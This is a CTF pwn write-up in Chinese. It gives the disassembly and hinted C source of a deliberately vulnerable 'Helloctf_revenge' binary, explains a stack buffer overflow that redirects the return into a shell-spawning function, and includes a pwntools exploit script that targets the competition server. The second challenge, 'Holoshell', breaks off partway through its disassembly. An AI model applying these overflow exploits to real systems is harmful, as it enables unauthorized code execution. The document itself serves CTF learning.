# Pwn  ctf

> 組名：WannaCry_QQ
>
> 王昱承、歐亭昀、蕭盛澤

## Helloctf_revenge

<details>
<summary>source code</summary>

[here](http://google)

```x86asm
helloctf_revenge:     file format elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:	f3 0f 1e fa          	endbr64 
  401004:	48 83 ec 08          	sub    rsp,0x8
  401008:	48 8b 05 e9 2f 00 00 	mov    rax,QWORD PTR [rip+0x2fe9]        # 403ff8 <__gmon_start__>
  40100f:	48 85 c0             	test   rax,rax
  401012:	74 02                	je     401016 <_init+0x16>
  401014:	ff d0                	call   rax
  401016:	48 83 c4 08          	add    rsp,0x8
  40101a:	c3                   	ret    

Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:	ff 35 e2 2f 00 00    	push   QWORD PTR [rip+0x2fe2]        # 404008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:	f2 ff 25 e3 2f 00 00 	bnd jmp QWORD PTR [rip+0x2fe3]        # 404010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:	0f 1f 00             	nop    DWORD PTR [rax]
  401030:	f3 0f 1e fa          	endbr64 
  401034:	68 00 00 00 00       	push   0x0
  401039:	f2 e9 e1 ff ff ff    	bnd jmp 401020 <.plt>
  40103f:	90                   	nop
  401040:	f3 0f 1e fa          	endbr64 
  401044:	68 01 00 00 00       	push   0x1
  401049:	f2 e9 d1 ff ff ff    	bnd jmp 401020 <.plt>
  40104f:	90                   	nop
  401050:	f3 0f 1e fa          	endbr64 
  401054:	68 02 00 00 00       	push   0x2
  401059:	f2 e9 c1 ff ff ff    	bnd jmp 401020 <.plt>
  40105f:	90                   	nop
  401060:	f3 0f 1e fa          	endbr64 
  401064:	68 03 00 00 00       	push   0x3
  401069:	f2 e9 b1 ff ff ff    	bnd jmp 401020 <.plt>
  40106f:	90                   	nop
  401070:	f3 0f 1e fa          	endbr64 
  401074:	68 04 00 00 00       	push   0x4
  401079:	f2 e9 a1 ff ff ff    	bnd jmp 401020 <.plt>
  40107f:	90                   	nop
  401080:	f3 0f 1e fa          	endbr64 
  401084:	68 05 00 00 00       	push   0x5
  401089:	f2 e9 91 ff ff ff    	bnd jmp 401020 <.plt>
  40108f:	90                   	nop
  401090:	f3 0f 1e fa          	endbr64 
  401094:	68 06 00 00 00       	push   0x6
  401099:	f2 e9 81 ff ff ff    	bnd jmp 401020 <.plt>
  40109f:	90                   	nop

Disassembly of section .plt.sec:

00000000004010a0 <puts@plt>:
  4010a0:	f3 0f 1e fa          	endbr64 
  4010a4:	f2 ff 25 6d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f6d]        # 404018 <puts@GLIBC_2.2.5>
  4010ab:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010b0 <strlen@plt>:
  4010b0:	f3 0f 1e fa          	endbr64 
  4010b4:	f2 ff 25 65 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f65]        # 404020 <strlen@GLIBC_2.2.5>
  4010bb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010c0 <system@plt>:
  4010c0:	f3 0f 1e fa          	endbr64 
  4010c4:	f2 ff 25 5d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f5d]        # 404028 <system@GLIBC_2.2.5>
  4010cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010d0 <strcmp@plt>:
  4010d0:	f3 0f 1e fa          	endbr64 
  4010d4:	f2 ff 25 55 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f55]        # 404030 <strcmp@GLIBC_2.2.5>
  4010db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010e0 <setvbuf@plt>:
  4010e0:	f3 0f 1e fa          	endbr64 
  4010e4:	f2 ff 25 4d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f4d]        # 404038 <setvbuf@GLIBC_2.2.5>
  4010eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000004010f0 <__isoc99_scanf@plt>:
  4010f0:	f3 0f 1e fa          	endbr64 
  4010f4:	f2 ff 25 45 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f45]        # 404040 <__isoc99_scanf@GLIBC_2.7>
  4010fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000401100 <exit@plt>:
  401100:	f3 0f 1e fa          	endbr64 
  401104:	f2 ff 25 3d 2f 00 00 	bnd jmp QWORD PTR [rip+0x2f3d]        # 404048 <exit@GLIBC_2.2.5>
  40110b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

0000000000401110 <_start>:
  401110:	f3 0f 1e fa          	endbr64 
  401114:	31 ed                	xor    ebp,ebp
  401116:	49 89 d1             	mov    r9,rdx
  401119:	5e                   	pop    rsi
  40111a:	48 89 e2             	mov    rdx,rsp
  40111d:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
  401121:	50                   	push   rax
  401122:	54                   	push   rsp
  401123:	49 c7 c0 90 13 40 00 	mov    r8,0x401390
  40112a:	48 c7 c1 20 13 40 00 	mov    rcx,0x401320
  401131:	48 c7 c7 72 12 40 00 	mov    rdi,0x401272
  401138:	ff 15 b2 2e 00 00    	call   QWORD PTR [rip+0x2eb2]        # 403ff0 <__libc_start_main@GLIBC_2.2.5>
  40113e:	f4                   	hlt    
  40113f:	90                   	nop

0000000000401140 <_dl_relocate_static_pie>:
  401140:	f3 0f 1e fa          	endbr64 
  401144:	c3                   	ret    
  401145:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  40114c:	00 00 00 
  40114f:	90                   	nop

0000000000401150 <deregister_tm_clones>:
  401150:	b8 60 40 40 00       	mov    eax,0x404060
  401155:	48 3d 60 40 40 00    	cmp    rax,0x404060
  40115b:	74 13                	je     401170 <deregister_tm_clones+0x20>
  40115d:	b8 00 00 00 00       	mov    eax,0x0
  401162:	48 85 c0             	test   rax,rax
  401165:	74 09                	je     401170 <deregister_tm_clones+0x20>
  401167:	bf 60 40 40 00       	mov    edi,0x404060
  40116c:	ff e0                	jmp    rax
  40116e:	66 90                	xchg   ax,ax
  401170:	c3                   	ret    
  401171:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  401178:	00 00 00 00 
  40117c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000401180 <register_tm_clones>:
  401180:	be 60 40 40 00       	mov    esi,0x404060
  401185:	48 81 ee 60 40 40 00 	sub    rsi,0x404060
  40118c:	48 89 f0             	mov    rax,rsi
  40118f:	48 c1 ee 3f          	shr    rsi,0x3f
  401193:	48 c1 f8 03          	sar    rax,0x3
  401197:	48 01 c6             	add    rsi,rax
  40119a:	48 d1 fe             	sar    rsi,1
  40119d:	74 11                	je     4011b0 <register_tm_clones+0x30>
  40119f:	b8 00 00 00 00       	mov    eax,0x0
  4011a4:	48 85 c0             	test   rax,rax
  4011a7:	74 07                	je     4011b0 <register_tm_clones+0x30>
  4011a9:	bf 60 40 40 00       	mov    edi,0x404060
  4011ae:	ff e0                	jmp    rax
  4011b0:	c3                   	ret    
  4011b1:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4011b8:	00 00 00 00 
  4011bc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

00000000004011c0 <__do_global_dtors_aux>:
  4011c0:	f3 0f 1e fa          	endbr64 
  4011c4:	80 3d bd 2e 00 00 00 	cmp    BYTE PTR [rip+0x2ebd],0x0        # 404088 <completed.8060>
  4011cb:	75 13                	jne    4011e0 <__do_global_dtors_aux+0x20>
  4011cd:	55                   	push   rbp
  4011ce:	48 89 e5             	mov    rbp,rsp
  4011d1:	e8 7a ff ff ff       	call   401150 <deregister_tm_clones>
  4011d6:	c6 05 ab 2e 00 00 01 	mov    BYTE PTR [rip+0x2eab],0x1        # 404088 <completed.8060>
  4011dd:	5d                   	pop    rbp
  4011de:	c3                   	ret    
  4011df:	90                   	nop
  4011e0:	c3                   	ret    
  4011e1:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4011e8:	00 00 00 00 
  4011ec:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

00000000004011f0 <frame_dummy>:
  4011f0:	f3 0f 1e fa          	endbr64 
  4011f4:	eb 8a                	jmp    401180 <register_tm_clones>

00000000004011f6 <init>:
  4011f6:	f3 0f 1e fa          	endbr64 
  4011fa:	55                   	push   rbp
  4011fb:	48 89 e5             	mov    rbp,rsp
  4011fe:	48 8b 05 6b 2e 00 00 	mov    rax,QWORD PTR [rip+0x2e6b]        # 404070 <stdin@@GLIBC_2.2.5>
  401205:	b9 00 00 00 00       	mov    ecx,0x0
  40120a:	ba 02 00 00 00       	mov    edx,0x2
  40120f:	be 00 00 00 00       	mov    esi,0x0
  401214:	48 89 c7             	mov    rdi,rax
  401217:	e8 c4 fe ff ff       	call   4010e0 <setvbuf@plt>
  40121c:	48 8b 05 3d 2e 00 00 	mov    rax,QWORD PTR [rip+0x2e3d]        # 404060 <stdout@@GLIBC_2.2.5>
  401223:	b9 00 00 00 00       	mov    ecx,0x0
  401228:	ba 02 00 00 00       	mov    edx,0x2
  40122d:	be 00 00 00 00       	mov    esi,0x0
  401232:	48 89 c7             	mov    rdi,rax
  401235:	e8 a6 fe ff ff       	call   4010e0 <setvbuf@plt>
  40123a:	48 8b 05 3f 2e 00 00 	mov    rax,QWORD PTR [rip+0x2e3f]        # 404080 <stderr@@GLIBC_2.2.5>
  401241:	b9 00 00 00 00       	mov    ecx,0x0
  401246:	ba 02 00 00 00       	mov    edx,0x2
  40124b:	be 00 00 00 00       	mov    esi,0x0
  401250:	48 89 c7             	mov    rdi,rax
  401253:	e8 88 fe ff ff       	call   4010e0 <setvbuf@plt>
  401258:	90                   	nop
  401259:	5d                   	pop    rbp
  40125a:	c3                   	ret    

000000000040125b <magic>:
  40125b:	f3 0f 1e fa          	endbr64 
  40125f:	55                   	push   rbp
  401260:	48 89 e5             	mov    rbp,rsp
  401263:	48 8d 3d 9e 0d 00 00 	lea    rdi,[rip+0xd9e]        # 402008 <_IO_stdin_used+0x8>
  40126a:	e8 51 fe ff ff       	call   4010c0 <system@plt>
  40126f:	90                   	nop
  401270:	5d                   	pop    rbp
  401271:	c3                   	ret    

0000000000401272 <main>:
  401272:	f3 0f 1e fa          	endbr64 
  401276:	55                   	push   rbp
  401277:	48 89 e5             	mov    rbp,rsp
  40127a:	48 83 ec 10          	sub    rsp,0x10
  40127e:	b8 00 00 00 00       	mov    eax,0x0
  401283:	e8 6e ff ff ff       	call   4011f6 <init>
  401288:	48 8d 3d 81 0d 00 00 	lea    rdi,[rip+0xd81]        # 402010 <_IO_stdin_used+0x10>
  40128f:	e8 0c fe ff ff       	call   4010a0 <puts@plt>
  401294:	48 8d 3d a0 0d 00 00 	lea    rdi,[rip+0xda0]        # 40203b <_IO_stdin_used+0x3b>
  40129b:	e8 00 fe ff ff       	call   4010a0 <puts@plt>
  4012a0:	48 8d 45 f0          	lea    rax,[rbp-0x10]
  4012a4:	48 89 c6             	mov    rsi,rax
  4012a7:	48 8d 3d a1 0d 00 00 	lea    rdi,[rip+0xda1]        # 40204f <_IO_stdin_used+0x4f>
  4012ae:	b8 00 00 00 00       	mov    eax,0x0
  4012b3:	e8 38 fe ff ff       	call   4010f0 <__isoc99_scanf@plt>
  4012b8:	48 8d 45 f0          	lea    rax,[rbp-0x10]
  4012bc:	48 89 c7             	mov    rdi,rax
  4012bf:	e8 ec fd ff ff       	call   4010b0 <strlen@plt>
  4012c4:	48 83 f8 10          	cmp    rax,0x10
  4012c8:	76 16                	jbe    4012e0 <main+0x6e>
  4012ca:	48 8d 3d 81 0d 00 00 	lea    rdi,[rip+0xd81]        # 402052 <_IO_stdin_used+0x52>
  4012d1:	e8 ca fd ff ff       	call   4010a0 <puts@plt>
  4012d6:	bf 00 00 00 00       	mov    edi,0x0
  4012db:	e8 20 fe ff ff       	call   401100 <exit@plt>
  4012e0:	48 8d 45 f0          	lea    rax,[rbp-0x10]
  4012e4:	48 8d 35 7c 0d 00 00 	lea    rsi,[rip+0xd7c]        # 402067 <_IO_stdin_used+0x67>
  4012eb:	48 89 c7             	mov    rdi,rax
  4012ee:	e8 dd fd ff ff       	call   4010d0 <strcmp@plt>
  4012f3:	85 c0                	test   eax,eax
  4012f5:	74 16                	je     40130d <main+0x9b>
  4012f7:	48 8d 3d 72 0d 00 00 	lea    rdi,[rip+0xd72]        # 402070 <_IO_stdin_used+0x70>
  4012fe:	e8 9d fd ff ff       	call   4010a0 <puts@plt>
  401303:	bf 00 00 00 00       	mov    edi,0x0
  401308:	e8 f3 fd ff ff       	call   401100 <exit@plt>
  40130d:	b8 00 00 00 00       	mov    eax,0x0
  401312:	c9                   	leave  
  401313:	c3                   	ret    
  401314:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  40131b:	00 00 00 
  40131e:	66 90                	xchg   ax,ax

0000000000401320 <__libc_csu_init>:
  401320:	f3 0f 1e fa          	endbr64 
  401324:	41 57                	push   r15
  401326:	4c 8d 3d e3 2a 00 00 	lea    r15,[rip+0x2ae3]        # 403e10 <__frame_dummy_init_array_entry>
  40132d:	41 56                	push   r14
  40132f:	49 89 d6             	mov    r14,rdx
  401332:	41 55                	push   r13
  401334:	49 89 f5             	mov    r13,rsi
  401337:	41 54                	push   r12
  401339:	41 89 fc             	mov    r12d,edi
  40133c:	55                   	push   rbp
  40133d:	48 8d 2d d4 2a 00 00 	lea    rbp,[rip+0x2ad4]        # 403e18 <__do_global_dtors_aux_fini_array_entry>
  401344:	53                   	push   rbx
  401345:	4c 29 fd             	sub    rbp,r15
  401348:	48 83 ec 08          	sub    rsp,0x8
  40134c:	e8 af fc ff ff       	call   401000 <_init>
  401351:	48 c1 fd 03          	sar    rbp,0x3
  401355:	74 1f                	je     401376 <__libc_csu_init+0x56>
  401357:	31 db                	xor    ebx,ebx
  401359:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
  401360:	4c 89 f2             	mov    rdx,r14
  401363:	4c 89 ee             	mov    rsi,r13
  401366:	44 89 e7             	mov    edi,r12d
  401369:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
  40136d:	48 83 c3 01          	add    rbx,0x1
  401371:	48 39 dd             	cmp    rbp,rbx
  401374:	75 ea                	jne    401360 <__libc_csu_init+0x40>
  401376:	48 83 c4 08          	add    rsp,0x8
  40137a:	5b                   	pop    rbx
  40137b:	5d                   	pop    rbp
  40137c:	41 5c                	pop    r12
  40137e:	41 5d                	pop    r13
  401380:	41 5e                	pop    r14
  401382:	41 5f                	pop    r15
  401384:	c3                   	ret    
  401385:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  40138c:	00 00 00 00 

0000000000401390 <__libc_csu_fini>:
  401390:	f3 0f 1e fa          	endbr64 
  401394:	c3                   	ret    

Disassembly of section .fini:

0000000000401398 <_fini>:
  401398:	f3 0f 1e fa          	endbr64 
  40139c:	48 83 ec 08          	sub    rsp,0x8
  4013a0:	48 83 c4 08          	add    rsp,0x8
  4013a4:	c3                   	ret    

```

</details>
<details>
<summary>hint code (原始c語言)</summary>

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    return;
}

void magic()
{
    execve("/bin/sh", NULL, NULL);
    return;
}

int main()
{
    init();
    char buf[0x10];
    puts("Do you like VTuber?");
    gets(buf);
    if (strncmp(buf, "yes", 3))
        exit(0);
    return 0;
}
```

</details>

**key concept :** <font color = #FF0080 > buffer overflow (BOF) </font>

**突破點 :**

1. 目標是使用 buffer overflow 將 ret 位置切換成想要的地方，進入程式後就有一個以 get 製作成的 input 來做 buffer overflow 
2. 要令 main function 正常結束，main裡面有2個判斷點：    
            
            1. 長度不能超過 0x10
            2. 輸入字串要和 yes 一模一樣  
    為了要和第2點相符，使用 `b"yes\x00"`作為輸入，後面隨便塞，\x00 代表著 NULL，當成是讀到 NULL時會以為字串已經結束了，正好通過了main的兩個檢測。
3. 最後，ret 指向的位置直接指向 lea處 <magic+8> 後，成功進入 Shell，如果要直接 ret 到 magic 的話，需要再前方插入 ret 指令，讓 rsp 可以對齊(0x10結尾)。

4. payload
```python
from pwn import *
context.arch = 'amd64'

magic = 0x40125b		# the address of magic func.
lea = 0x401263		# the address of ”lea”

p = remote('ctf.adl.tw',10001)
# p = process('helloctf_revenge')
pause()
# send yes+trash+lea
payload = flat(b"yes\x00",cyclic(0x4),cyclic(0x10),lea) 
p.sendlineafter(b"Do you like VTuber?\n",payload)

p.interactive()
p.close()
```

## Holoshell
<details>
<summary>source code</summary>

![download]()

```x86asm

holoshell:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64 
    1004:	48 83 ec 08          	sub    rsp,0x8
    1008:	48 8b 05 d9 3f 00 00 	mov    rax,QWORD PTR [rip+0x3fd9]        # 4fe8 <__gmon_start__>
    100f:	48 85 c0             	test   rax,rax
    1012:	74 02                	je     1016 <_init+0x16>
    1014:	ff d0                	call   rax
    1016:	48 83 c4 08          	add    rsp,0x8
    101a:	c3                   	ret    

Disassembly of section .plt:

0000000000001020 <.plt>:
    1020:	ff 35 32 3f 00 00    	push   QWORD PTR [rip+0x3f32]        # 4f58 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	f2 ff 25 33 3f 00 00 	bnd jmp QWORD PTR [rip+0x3f33]        # 4f60 <_GLOBAL_OFFSET_TABLE_+0x10>
    102d:	0f 1f 00             	nop    DWORD PTR [rax]
    1030:	f3 0f 1e fa          	endbr64 
    1034:	68 00 00 00 00       	push   0x0
    1039:	f2 e9 e1 ff ff ff    	bnd jmp 1020 <.plt>
    103f:	90                   	nop
    1040:	f3 0f 1e fa          	endbr64 
    1044:	68 01 00 00 00       	push   0x1
    1049:	f2 e9 d1 ff ff ff    	bnd jmp 1020 <.plt>
    104f:	90                   	nop
    1050:	f3 0f 1e fa          	endbr64 
    1054:	68 02 00 00 00       	push   0x2
    1059:	f2 e9 c1 ff ff ff    	bnd jmp 1020 <.plt>
    105f:	90                   	nop
    1060:	f3 0f 1e fa          	endbr64 
    1064:	68 03 00 00 00       	push   0x3
    1069:	f2 e9 b1 ff ff ff    	bnd jmp 1020 <.plt>
    106f:	90                   	nop
    1070:	f3 0f 1e fa          	endbr64 
    1074:	68 04 00 00 00       	push   0x4
    1079:	f2 e9 a1 ff ff ff    	bnd jmp 1020 <.plt>
    107f:	90                   	nop
    1080:	f3 0f 1e fa          	endbr64 
    1084:	68 05 00 00 00       	push   0x5
    1089:	f2 e9 91 ff ff ff    	bnd jmp 1020 <.plt>
    108f:	90                   	nop
    1090:	f3 0f 1e fa          	endbr64 
    1094:	68 06 00 00 00       	push   0x6
    1099:	f2 e9 81 ff ff ff    	bnd jmp 1020 <.plt>
    109f:	90                   	nop
    10a0:	f3 0f 1e fa          	endbr64 
    10a4:	68 07 00 00 00       	push   0x7
    10a9:	f2 e9 71 ff ff ff    	bnd jmp 1020 <.plt>
    10af:	90                   	nop
    10b0:	f3 0f 1e fa          	endbr64 
    10b4:	68 08 00 00 00       	push   0x8
    10b9:	f2 e9 61 ff ff ff    	bnd jmp 1020 <.plt>
    10bf:	90                   	nop
    10c0:	f3 0f 1e fa          	endbr64 
    10c4:	68 09 00 00 00       	push   0x9
    10c9:	f2 e9 51 ff ff ff    	bnd jmp 1020 <.plt>
    10cf:	90                   	nop
    10d0:	f3 0f 1e fa          	endbr64 
    10d4:	68 0a 00 00 00       	push   0xa
    10d9:	f2 e9 41 ff ff ff    	bnd jmp 1020 <.plt>
    10df:	90                   	nop
    10e0:	f3 0f 1e fa          	endbr64 
    10e4:	68 0b 00 00 00       	push   0xb
    10e9:	f2 e9 31 ff ff ff    	bnd jmp 1020 <.plt>
    10ef:	90                   	nop
    10f0:	f3 0f 1e fa          	endbr64 
    10f4:	68 0c 00 00 00       	push   0xc
    10f9:	f2 e9 21 ff ff ff    	bnd jmp 1020 <.plt>
    10ff:	90                   	nop
    1100:	f3 0f 1e fa          	endbr64 
    1104:	68 0d 00 00 00       	push   0xd
    1109:	f2 e9 11 ff ff ff    	bnd jmp 1020 <.plt>
    110f:	90                   	nop

Disassembly of section .plt.got:

0000000000001110 <__cxa_finalize@plt>:
    1110:	f3 0f 1e fa          	endbr64 
    1114:	f2 ff 25 dd 3e 00 00 	bnd jmp QWORD PTR [rip+0x3edd]        # 4ff8 <__cxa_finalize@GLIBC_2.2.5>
    111b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .plt.sec:

0000000000001120 <free@plt>:
    1120:	f3 0f 1e fa          	endbr64 
    1124:	f2 ff 25 3d 3e 00 00 	bnd jmp QWORD PTR [rip+0x3e3d]        # 4f68 <free@GLIBC_2.2.5>
    112b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001130 <strncmp@plt>:
    1130:	f3 0f 1e fa          	endbr64 
    1134:	f2 ff 25 35 3e 00 00 	bnd jmp QWORD PTR [rip+0x3e35]        # 4f70 <strncmp@GLIBC_2.2.5>
    113b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001140 <puts@plt>:
    1140:	f3 0f 1e fa          	endbr64 
    1144:	f2 ff 25 2d 3e 00 00 	bnd jmp QWORD PTR [rip+0x3e2d]        # 4f78 <puts@GLIBC_2.2.5>
    114b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001150 <write@plt>:
    1150:	f3 0f 1e fa          	endbr64 
    1154:	f2 ff 25 25 3e 00 00 	bnd jmp QWORD PTR [rip+0x3e25]        # 4f80 <write@GLIBC_2.2.5>
    115b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001160 <__stack_chk_fail@plt>:
    1160:	f3 0f 1e fa          	endbr64 
    1164:	f2 ff 25 1d 3e 00 00 	bnd jmp QWORD PTR [rip+0x3e1d]        # 4f88 <__stack_chk_fail@GLIBC_2.4>
    116b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001170 <system@plt>:
    1170:	f3 0f 1e fa          	endbr64 
    1174:	f2 ff 25 15 3e 00 00 	bnd jmp QWORD PTR [rip+0x3e15]        # 4f90 <system@GLIBC_2.2.5>
    117b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001180 <memset@plt>:
    1180:	f3 0f 1e fa          	endbr64 
    1184:	f2 ff 25 0d 3e 00 00 	bnd jmp QWORD PTR [rip+0x3e0d]        # 4f98 <memset@GLIBC_2.2.5>
    118b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001190 <read@plt>:
    1190:	f3 0f 1e fa          	endbr64 
    1194:	f2 ff 25 05 3e 00 00 	bnd jmp QWORD PTR [rip+0x3e05]        # 4fa0 <read@GLIBC_2.2.5>
    119b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000011a0 <srand@plt>:
    11a0:	f3 0f 1e fa          	endbr64 
    11a4:	f2 ff 25 fd 3d 00 00 	bnd jmp QWORD PTR [rip+0x3dfd]        # 4fa8 <srand@GLIBC_2.2.5>
    11ab:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000011b0 <time@plt>:
    11b0:	f3 0f 1e fa          	endbr64 
    11b4:	f2 ff 25 f5 3d 00 00 	bnd jmp QWORD PTR [rip+0x3df5]        # 4fb0 <time@GLIBC_2.2.5>
    11bb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000011c0 <asprintf@plt>:
    11c0:	f3 0f 1e fa          	endbr64 
    11c4:	f2 ff 25 ed 3d 00 00 	bnd jmp QWORD PTR [rip+0x3ded]        # 4fb8 <asprintf@GLIBC_2.2.5>
    11cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000011d0 <setvbuf@plt>:
    11d0:	f3 0f 1e fa          	endbr64 
    11d4:	f2 ff 25 e5 3d 00 00 	bnd jmp QWORD PTR [rip+0x3de5]        # 4fc0 <setvbuf@GLIBC_2.2.5>
    11db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000011e0 <exit@plt>:
    11e0:	f3 0f 1e fa          	endbr64 
    11e4:	f2 ff 25 dd 3d 00 00 	bnd jmp QWORD PTR [rip+0x3ddd]        # 4fc8 <exit@GLIBC_2.2.5>
    11eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000011f0 <rand@plt>:
    11f0:	f3 0f 1e fa          	endbr64 
    11f4:	f2 ff 25 d5 3d 00 00 	bnd jmp QWORD PTR [rip+0x3dd5]        # 4fd0 <rand@GLIBC_2.2.5>
    11fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .text:

0000000000001200 <_start>:
    1200:	f3 0f 1e fa          	endbr64 
    1204:	31 ed                	xor    ebp,ebp
    1206:	49 89 d1             	mov    r9,rdx
    1209:	5e                   	pop    rsi
    120a:	48 89 e2             	mov    rdx,rsp
    120d:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
    1211:	50                   	push   rax
    1212:	54                   	push   rsp
    1213:	4c 8d 05 36 06 00 00 	lea    r8,[rip+0x636]        # 1850 <__libc_csu_fini>
    121a:	48 8d 0d bf 05 00 00 	lea    rcx,[rip+0x5bf]        # 17e0 <__libc_csu_init>
    1221:	48 8d 3d 4a 05 00 00 	lea    rdi,[rip+0x54a]        # 1772 <main>
    1228:	ff 15 b2 3d 00 00    	call   QWORD PTR [rip+0x3db2]        # 4fe0 <__libc_start_main@GLIBC_2.2.5>
    122e:	f4                   	hlt    
    122f:	90                   	nop

0000000000001230 <deregister_tm_clones>:
    1230:	48 8d 3d d9 3d 00 00 	lea    rdi,[rip+0x3dd9]        # 5010 <__TMC_END__>
    1237:	48 8d 05 d2 3d 00 00 	lea    rax,[rip+0x3dd2]        # 5010 <__TMC_END__>
    123e:	48 39 f8             	cmp    rax,rdi
    1241:	74 15                	je     1258 <deregister_tm_clones+0x28>
    1243:	48 8b 05 8e 3d 00 00 	mov    rax,QWORD PTR [rip+0x3d8e]        # 4fd8 <_ITM_deregisterTMCloneTable>
    124a:	48 85 c0             	test   rax,rax
    124d:	74 09                	je     1258 <deregister_tm_clones+0x28>
    124f:	ff e0                	jmp    rax
    1251:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
    1258:	c3                   	ret    
    1259:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

0000000000001260 <register_tm_clones>:
    1260:	48 8d 3d a9 3d 00 00 	lea    rdi,[rip+0x3da9]        # 5010 <__TMC_END__>
    1267:	48 8d 35 a2 3d 00 00 	lea    rsi,[rip+0x3da2]        # 5010 <__TMC_END__>
    126e:	48 29 fe             	sub    rsi,rdi
    1271:	48 89 f0             	mov    rax,rsi
    1274:	48 c1 ee 3f          	shr    rsi,0x3f
    1278:	48 c1 f8 03          	sar    rax,0x3
    127c:	48 01 c6             	add    rsi,rax
    127f:	48 d1 fe             	sar    rsi,1
    1282:	74 14                	je     1298 <register_tm_clones+0x38>
    1284:	48 8b 05 65 3d 00 00 	mov    rax,QWORD PTR [rip+0x3d65]        # 4ff0 <_ITM_registerTMCloneTable>
    128b:	48 85 c0             	test   rax,rax
    128e:	74 08                	je     1298 <register_tm_clones+0x38>
    1290:	ff e0                	jmp    rax
    1292:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
    1298:	c3                   	ret    
    1299:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

00000000000012a0 <__do_global_dtors_aux>:
    12a0:	f3 0f 1e fa          	endbr64 
    12a4:	80 3d 9d 3d 00 00 00 	cmp    BYTE PTR [rip+0x3d9d],0x0        # 5048 <completed.8060>
    12ab:	75 2b                	jne    12d8 <__do_global_dtors_aux+0x38>
    12ad:	55                   	push   rbp
    12ae:	48 83 3d 42 3d 00 00 	cmp    QWORD PTR [rip+0x3d42],0x0        # 4ff8 <__cxa_finalize@GLIBC_2.2.5>
    12b5:	00 
    12b6:	48 89 e5             	mov    rbp,rsp
    12b9:	74 0c                	je     12c7 <__do_global_dtors_aux+0x27>
    12bb:	48 8b 3d 46 3d 00 00 	mov    rdi,QWORD PTR [rip+0x3d46]        # 5008 <__dso_handle>
    12c2:	e8 49 fe ff ff       	call   1110 <__cxa_finalize@plt>
    12c7:	e8 64 ff ff ff       	call   1230 <deregister_tm_clones>
    12cc:	c6 05 75 3d 00 00 01 	mov    BYTE PTR [rip+0x3d75],0x1        # 5048 <completed.8060>
    12d3:	5d                   	pop    rbp
    12d4:	c3                   	ret    
    12d5:	0f 1f 00             	nop    DWORD PTR [rax]
    12d8:	c3                   	ret    
    12d9:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

00000000000012e0 <frame_dummy>:
    12e0:	f3 0f 1e fa          	endbr64 
    12e4:	e9 77 ff ff ff       	jmp    1260 <register_tm_clones>

00000000000012e9 <init>:
    12e9:	f3 0f 1e fa          	endbr64 
    12ed:	55                   	push   rbp
    12ee:	48 89 e5             	mov    rbp,rsp
